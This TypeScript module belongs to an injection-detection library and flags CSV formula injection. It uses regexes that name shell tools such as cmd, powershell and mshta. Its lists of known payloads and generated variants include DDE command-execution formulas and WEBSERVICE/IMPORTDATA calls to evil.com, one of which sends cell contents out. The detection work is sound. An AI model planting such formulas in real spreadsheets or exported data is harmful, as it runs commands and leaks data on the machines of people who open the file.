import type { DetectionLevelResult, InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'

const FORMULA_TRIGGER_RE = /^\s*[=+\-@]/
const FUNCTION_CALL_RE = /\b[A-Z_][A-Z0-9_]*\s*\(/i
const CMD_PIPE_RE = /^\s*[=+\-@]\s*CMD\s*\|/i
const PIPE_SHELL_RE = /\|\s*'?[\s"]*(?:\/C\b|cmd\b|powershell\b|pwsh\b|bash\b|sh\b|mshta\b|wscript\b|cscript\b|rundll32\b|calc\b)/i
const AT_SUM_RE = /^\s*@\s*SUM\s*\(/i
const URL_RE = /(?:https?:\/\/|ftp:\/\/|file:\/\/|\/\/[a-z0-9.-]+\.[a-z]{2,})/i
const URL_FUNCTION_RE = /\b(?:HYPERLINK|IMPORTDATA|WEBSERVICE)\s*\([^)]*(?:https?:\/\/|ftp:\/\/|file:\/\/|\/\/[a-z0-9.-]+\.[a-z]{2,})/i
const URL_COMPOSITION_RE = /\b(?:SUM|CHAR|CONCATENATE)\s*\([^)]*(?:https?:\/\/|ftp:\/\/|file:\/\/|\/\/[a-z0-9.-]+\.[a-z]{2,})/i

function isCsvDdeFormula(cell: string): boolean {
    const value = cell.trim()
    if (!FORMULA_TRIGGER_RE.test(value)) return false

    const hasFunctionCall = FUNCTION_CALL_RE.test(value)
    const hasPipe = value.includes('|')

    if (CMD_PIPE_RE.test(value)) return true
    if (AT_SUM_RE.test(value)) return true
    if (URL_FUNCTION_RE.test(value)) return true
    if (URL_COMPOSITION_RE.test(value)) return true
    if (hasPipe && PIPE_SHELL_RE.test(value)) return true
    if ((hasFunctionCall || hasPipe) && /(?:CMD\s*\||DDE|!\s*[A-Z]+\d+)/i.test(value)) return true

    return hasFunctionCall || hasPipe
}

export const csvInjection: InvariantClassModule = {
    id: 'csv_injection',
    description: 'CSV injection / formula injection via DDE and spreadsheet function abuse',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },

    mitre: ['T1059'],
    cwe: 'CWE-1236',

    knownPayloads: [
        "=CMD|' /C whoami'\\!A0",
        "@SUM(1+1)*cmd|' /C calc'\\!A0",
        "+cmd|' /C mshta http://evil'\\!A0",
        '=HYPERLINK("http://evil.com",1)',
        '=WEBSERVICE("http://evil.com/"&A1)',
        '=IMPORTDATA("http://evil.com/")',
    ],

    knownBenign: [
        'normal text',
        '1234',
        'user@email.com',
        'price: 5.99',
        'company name',
    ],

    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const cells = decoded.split(/[\r\n,]/).map(c => c.trim()).filter(Boolean)
        for (const cell of cells) {
            if (!FORMULA_TRIGGER_RE.test(cell)) continue
            if (isCsvDdeFormula(cell)) return true

            if (CMD_PIPE_RE.test(cell)) return true
            if (/\b(?:HYPERLINK|IMPORTDATA|WEBSERVICE)\s*\(/i.test(cell) && URL_RE.test(cell)) return true
            if (/\b(?:SUM|CHAR|CONCATENATE)\s*\(/i.test(cell) && URL_RE.test(cell)) return true
            if (/\|\s*'?[\s"]*\/C\b/i.test(cell)) return true
        }
        return false
    },

    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const tokens = decoded.split(',')
        for (const token of tokens) {
            const value = token.trim()
            if (!FORMULA_TRIGGER_RE.test(value)) continue
            if (!value.includes('|') && !FUNCTION_CALL_RE.test(value)) continue
            return {
                detected: true,
                confidence: 0.90,
                explanation: 'CSV tokenization found formula-triggered cell with DDE/function structure',
                evidence: value,
                structuredEvidence: [{
                    operation: 'semantic_eval',
                    matchedInput: value,
                    interpretation: 'Spreadsheet formula trigger combined with function/pipe indicates formula injection risk',
                    offset: Math.max(0, decoded.indexOf(value)),
                    property: 'CSV cells must not evaluate attacker-controlled formulas or DDE commands',
                }],
            }
        }
        return null
    },

    generateVariants: (count: number): string[] => {
        const variants = [
            "=CMD|' /C whoami'\\!A0",
            "@SUM(1+1)*cmd|' /C calc'\\!A0",
            "+cmd|' /C mshta http://evil'\\!A0",
            '=HYPERLINK("http://evil.com",1)',
            '=WEBSERVICE("http://evil.com/"&A1)',
            '=IMPORTDATA("http://evil.com/")',
        ]
        return variants.slice(0, count)
    },
}
